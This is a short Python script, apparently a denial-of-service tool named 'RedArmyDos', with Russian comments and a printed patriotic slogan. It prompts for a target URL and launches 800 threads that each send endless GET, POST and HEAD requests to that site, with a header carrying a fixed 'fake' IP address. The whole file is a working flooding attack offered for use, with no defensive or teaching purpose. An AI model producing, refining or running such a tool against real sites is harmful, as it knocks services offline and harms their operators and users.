import requests
from threading import Thread
import random

#настройки
FakeIp = '92.223.109.96'

user = [FakeIp]

headers = {'0': random.choice(user)}

#работа
print('RedArmyDos')
adres = str(input('link:'))
def send():
	while True:
		requests.get(adres, headers=headers)
		print('Красная армия всех сильней!')
		requests.post(adres, headers=headers)
		print('Красная армия всех сильней!')
		requests.head(adres, headers=headers)
		print('Красная армия всех сильней!')

if __name__ == '__main__':
	for i in range(800):
		thr = Thread(target=send)
		thr.start()